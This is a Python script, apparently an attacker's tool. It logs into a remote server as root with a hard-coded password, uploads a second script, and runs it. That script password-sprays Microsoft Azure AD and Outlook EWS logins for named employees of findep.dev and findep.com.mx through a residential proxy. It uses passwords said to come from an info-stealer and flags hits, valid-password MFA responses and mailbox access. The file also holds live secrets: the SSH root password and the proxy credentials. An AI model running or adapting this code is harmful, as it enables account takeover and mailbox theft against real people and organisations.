import paramiko, sys, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = """
import requests, urllib3, json, sys, time, base64
urllib3.disable_warnings()

PROXY = "http://brd-customer-hl_25b43d3c-zone-residential_mx1-country-mx:erjvs0sv8cvs@brd.superproxy.io:22225"
P = {"http": PROXY, "https": PROXY}

try:
    r = requests.get("https://httpbin.org/ip", proxies=P, verify=False, timeout=15)
    sys.stdout.write("EXIT IP: " + r.json().get("origin","?") + "\\n")
    sys.stdout.flush()
except:
    sys.stdout.write("Proxy fail — direct\\n")
    P = {}
    sys.stdout.flush()

TENANT_DEV = "d37bcda5-7136-468e-a984-4a47aa1468aa"
TENANT_COMMX = "c5306fea-e13c-419e-adbe-e642c502de26"
CID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
CID2 = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Users confirmed EXISTING in findep.dev
USERS_DEV = ["jeff", "jsanchezfern", "mmartinez"]
# bmendezar is LOCKED — skip

# All passwords from stealer + common variants
PASSWORDS = [
    "AFI2022*", "afi2022*", "AFI2023*", "AFI2024*", "AFI2025*", "AFI2026*",
    "4dm1n##*2411", "BcF1s42o2d*", "Rul76846", "rul76846",
    "Pao1234+", "Findep2022*", "Findep2023*", "Findep2024*", "Findep2025*", "Findep2026*",
    "Findep2022!", "Findep2023!", "Findep2024!", "Findep2025!", "Findep2026!",
    "Welcome1!", "Password1!", "Temporal1", "Temporal1!",
    "findep2022", "findep2023", "findep2024",
]

sys.stdout.write("\\n=== AZURE AD findep.dev SPRAY (via MX proxy) ===\\n\\n")

for user in USERS_DEV:
    email = user + "@findep.dev"
    stopped = False
    for pw in PASSWORDS:
        if stopped:
            break
        try:
            r = requests.post("https://login.microsoftonline.com/" + TENANT_DEV + "/oauth2/v2.0/token",
                data={"grant_type":"password","client_id":CID,"username":email,"password":pw,
                      "scope":"https://graph.microsoft.com/.default"},
                proxies=P, verify=False, timeout=12)
            if r.status_code == 200:
                sys.stdout.write("*** HIT *** " + email + ":" + pw + "\\n")
                td = r.json()
                at = td.get("access_token","")
                if at:
                    parts = at.split(".")
                    if len(parts) >= 2:
                        pl = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
                        sys.stdout.write("  UPN=" + str(pl.get("upn")) + " Name=" + str(pl.get("name")) + "\\n")
                    hh = {"Authorization": "Bearer " + at}
                    rm = requests.get("https://graph.microsoft.com/v1.0/me", headers=hh, proxies=P, verify=False, timeout=10)
                    sys.stdout.write("  /me: " + rm.text[:300] + "\\n")
                stopped = True
            else:
                ed = r.json().get("error_description","")[:120]
                tag = ""
                if "50053" in ed:
                    tag = "[LOCKED]"
                    stopped = True
                elif "50126" in ed: tag = "[BAD]"
                elif "50076" in ed or "50079" in ed:
                    tag = "[MFA-PW VALID!]"
                    stopped = True
                elif "53003" in ed or "50158" in ed:
                    tag = "[COND ACCESS-PW VALID!]"
                    stopped = True
                elif "50057" in ed:
                    tag = "[DISABLED]"
                    stopped = True
                sys.stdout.write("  " + tag + " " + email + ":" + pw + "\\n")
        except Exception as e:
            sys.stdout.write("  ERR " + email + ":" + pw + " " + str(e)[:40] + "\\n")
        time.sleep(2)
        sys.stdout.flush()
    sys.stdout.write("\\n")

# --- Also try findep.com.mx tenant ---
sys.stdout.write("\\n=== AZURE AD findep.com.mx SPRAY ===\\n\\n")

USERS_COMMX = ["jsanchezfern", "bemedezar", "mmartinez", "admin", "jeff",
               "bmendezar", "hgarciaar", "cguerrave"]
PWS_SHORT = ["AFI2022*", "BcF1s42o2d*", "4dm1n##*2411", "Rul76846", "Pao1234+"]

for user in USERS_COMMX:
    email = user + "@findep.com.mx"
    for pw in PWS_SHORT:
        try:
            r = requests.post("https://login.microsoftonline.com/" + TENANT_COMMX + "/oauth2/v2.0/token",
                data={"grant_type":"password","client_id":CID,"username":email,"password":pw,
                      "scope":"https://graph.microsoft.com/.default"},
                proxies=P, verify=False, timeout=12)
            if r.status_code == 200:
                sys.stdout.write("*** HIT *** " + email + ":" + pw + "\\n")
            else:
                ed = r.json().get("error_description","")[:100]
                tag = ""
                if "50053" in ed: tag = "[LOCKED]"
                elif "50034" in ed: tag = "[NOT FOUND]"
                elif "50126" in ed: tag = "[BAD PW]"
                elif "50076" in ed or "50079" in ed: tag = "[MFA-PW VALID!]"
                elif "53003" in ed: tag = "[COND ACCESS]"
                sys.stdout.write("  " + tag + " " + email + ":" + pw + "\\n")
                if "50034" in ed:
                    break
                if "50053" in ed:
                    break
        except Exception as e:
            sys.stdout.write("  ERR " + email + " " + str(e)[:40] + "\\n")
        time.sleep(2)
        sys.stdout.flush()

# --- Outlook OWA + EWS via proxy ---
sys.stdout.write("\\n=== OUTLOOK OWA / EWS (findep.dev users) ===\\n\\n")

owa_creds = [
    ("jsanchezfern@findep.dev", "AFI2022*"),
    ("jeff@findep.dev", "AFI2022*"),
    ("mmartinez@findep.dev", "Rul76846"),
    ("bmendezar@findep.dev", "Pao1234+"),
    ("jsanchezfern@findep.global", "AFI2022*"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("admin@findep.global", "4dm1n##*2411"),
    ("admin@findep.global", "BcF1s42o2d*"),
]

for email, pw in owa_creds:
    try:
        ab = base64.b64encode((email + ":" + pw).encode()).decode()
        r = requests.get(
            "https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/" + email + "?Protocol=ActiveSync",
            headers={"Authorization": "Basic " + ab, "User-Agent": UA},
            proxies=P, verify=False, timeout=12, allow_redirects=False)
        tag = str(r.status_code)
        if r.status_code == 200: tag = "*** AUTODISCOVER HIT ***"
        elif r.status_code == 456: tag = "456 MFA-PW VALID!"
        elif r.status_code == 302: tag = "302 -> " + r.headers.get("Location","")[:60]
        sys.stdout.write("  [" + tag + "] " + email + ":" + pw + "\\n")
    except Exception as e:
        sys.stdout.write("  ERR " + email + " " + str(e)[:40] + "\\n")
    time.sleep(1.5)
    sys.stdout.flush()

# EWS
sys.stdout.write("\\n=== EWS ===\\n")
soap = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><soap:Body><GetFolder xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"><FolderShape><t:BaseShape>Default</t:BaseShape></FolderShape><FolderIds><t:DistinguishedFolderId Id="inbox"/></FolderIds></GetFolder></soap:Body></soap:Envelope>'

for email, pw in owa_creds:
    try:
        ab = base64.b64encode((email + ":" + pw).encode()).decode()
        r = requests.post("https://outlook.office365.com/EWS/Exchange.asmx",
            headers={"Authorization": "Basic " + ab, "Content-Type": "text/xml", "User-Agent": UA},
            data=soap, proxies=P, verify=False, timeout=12)
        tag = str(r.status_code)
        if r.status_code == 200 and "GetFolderResponse" in r.text: tag = "*** MAILBOX ***"
        elif r.status_code == 456: tag = "456 MFA"
        sys.stdout.write("  [" + tag + "] " + email + ":" + pw + "\\n")
    except Exception as e:
        sys.stdout.write("  ERR " + email + " " + str(e)[:40] + "\\n")
    time.sleep(1.5)
    sys.stdout.flush()

sys.stdout.write("\\n=== DONE ===\\n")
"""

sftp = ssh.open_sftp()
with sftp.open('/root/findep_dev_spray.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

transport = ssh.get_transport()
channel = transport.open_session()
channel.exec_command('python3 -u /root/findep_dev_spray.py 2>&1')
channel.settimeout(5)

start = time.time()
while time.time() - start < 300:
    try:
        if channel.recv_ready():
            chunk = channel.recv(8192).decode(errors='replace')
            sys.stdout.write(chunk)
            sys.stdout.flush()
        elif channel.exit_status_ready():
            while channel.recv_ready():
                chunk = channel.recv(8192).decode(errors='replace')
                sys.stdout.write(chunk)
                sys.stdout.flush()
            break
        else:
            time.sleep(0.3)
    except Exception:
        time.sleep(0.3)

print('\nFin.', flush=True)
ssh.close()
